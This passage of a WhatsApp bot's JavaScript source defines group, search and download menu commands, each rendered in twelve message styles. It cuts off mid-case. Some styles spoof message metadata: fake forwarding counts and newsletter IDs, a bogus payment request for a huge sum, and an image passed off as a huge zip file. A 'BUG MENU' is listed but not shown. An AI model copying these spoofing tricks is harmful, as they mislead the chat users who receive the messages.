                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'groupmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Group* 」❍
│${setv} ${prefix}*antibot ∆*
│${setv} ${prefix}*antivv ∆*
│${setv} ${prefix}*vv ∆*
│${setv} ${prefix}*welcome ∆*
│${setv} ${prefix}*adminevent ∆*
│${setv} ${prefix}*groupevent ∆*
│${setv} ${prefix}*antiforeign ∆*
│${setv} ${prefix}*antimedia ∆*
│${setv} ${prefix}*antiaudio ∆*
│${setv} ${prefix}*antivideo ∆*
│${setv} ${prefix}*antiimage ∆*
│${setv} ${prefix}*antidocument ∆*
│${setv} ${prefix}*antilocation ∆*
│${setv} ${prefix}*anticontact ∆*
│${setv} ${prefix}*antisticker ∆*
│${setv} ${prefix}*antipoll ∆*
│${setv} ${prefix}*antilink ∆*
│${setv} ${prefix}*antipromotion ∆*
│${setv} ${prefix}*antivirtex ∆*
│${setv} ${prefix}*grouplink ∆*
│${setv} ${prefix}*listadmin ∆*
│${setv} ${prefix}*invite ∆*
│${setv} ${prefix}*ephemeral ∆*
│${setv} ${prefix}*delete ∆*
│${setv} ${prefix}*setppgroup ∆*
│${setv} ${prefix}*delppgroup ∆*
│${setv} ${prefix}*setnamegc ∆*
│${setv} ${prefix}*setdesc ∆*
│${setv} ${prefix}*add ∆*
│${setv} ${prefix}*kick ∆*
│${setv} ${prefix}*promote ∆*
│${setv} ${prefix}*demote ∆*
│${setv} ${prefix}*kickall ∆*
│${setv} ${prefix}*promoteall ∆*
│${setv} ${prefix}*demoteall ∆*
│${setv} ${prefix}*getcontact✓*
│${setv} ${prefix}*savecontact✓*
│${setv} ${prefix}*sendcontact✓*
│${setv} ${prefix}*contactag✓*
│${setv} ${prefix}*hidetag ∆*
│${setv} ${prefix}*totag ∆*
│${setv} ${prefix}*tagall ∆*
│${setv} ${prefix}*editinfo ∆*
│${setv} ${prefix}*opentime ∆*
│${setv} ${prefix}*closetime ∆*
│${setv} ${prefix}*resetlink ∆*
│${setv} ${prefix}*getbio ∆*
│${setv} ${prefix}*vote ∆*
│${setv} ${prefix}*upvote ∆*
│${setv} ${prefix}*downvote ∆*
│${setv} ${prefix}*checkvote ∆*
│${setv} ${prefix}*delvote ∆*
│${setv} ${prefix}*antivirus ∆*
│${setv} ${prefix}*antibadword ∆*
│${setv} ${prefix}*nsfw ∆*
│${setv} ${prefix}*react ∆*
│${setv} ${prefix}*getjoinrequest ∆*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/dPi0QXt.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/dPi0QXt.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'searchmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Search* 」❍
│${setv} ${prefix}*google√*
│${setv} ${prefix}*wikipedia√*
│${setv} ${prefix}*ytsearch√*
│${setv} ${prefix}*apksearch√*
│${setv} ${prefix}*stickersearch√*
│${setv} ${prefix}*imdb√*
│${setv} ${prefix}*wanumber√*
│${setv} ${prefix}*friend√*
│${setv} ${prefix}*lyrics√*
│${setv} ${prefix}*pixiv√*
│${setv} ${prefix}*ssc*
│${setv} ${prefix}*soundcloud*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/Q3CXFAH.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/Q3CXFAH.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Developer 👁️\",\"url\":\"https://wa.me/+2347082664317\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"LIST MENU 📃",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"CHANNEL 👥\",\"url\":\"https://whatsapp.com/channel/0029VajIDgjDZ4LVnxfB1Z2s\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'downloadmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${veranytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *✓ = For Owner* 
├ *√ = For Free User*
├ *√ = For Premium User*
╰─┬────❍
╭─┴❍「 *Download* 」❍
│${setv} ${prefix}*itunes√*
│${setv} ${prefix}*play√*
│${setv} ${prefix}*ytmp3√*
│${setv} ${prefix}*ytmp4√*
│${setv} ${prefix}*tiktok√*
│${setv} ${prefix}*tiktokaudio√*
│${setv} ${prefix}*tiktokvideo√*
│${setv} ${prefix}*igvideo√*
│${setv} ${prefix}*igimage√*
│${setv} ${prefix}*facebook√*
│${setv} ${prefix}*twitter√*
│${setv} ${prefix}*bilibili√*
│${setv} ${prefix}*dailymotion√*
│${setv} ${prefix}*apk√*
│${setv} ${prefix}*modwa√*
│${setv} ${prefix}*mega√*
│${setv} ${prefix}*mediafire√*
│${setv} ${prefix}*google√*
│${setv} ${prefix}*gimage√*
│${setv} ${prefix}*weather√*
│${setv} ${prefix}*spotify™*
│${setv} ${prefix}*gitclone√*
│${setv} ${prefix}*happymod√*
│${setv} ${prefix}*gdrive√*
│${setv} ${prefix}*pinterest√*
│${setv} ${prefix}*ringtone√*
│${setv} ${prefix}*autodownload✓*
╰──────❍`
if (typemenu === 'v1') {
                    VeranBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    VeranBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    VeranBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    VeranBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    VeranBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    VeranBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./VTHmedia/theme/VthPic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	VeranBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.imgur.com/uFNJS63.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	VeranBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./VTHmedia/theme/Vth-Video.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "100000000000000000@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.imgur.com/uFNJS63.jpeg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
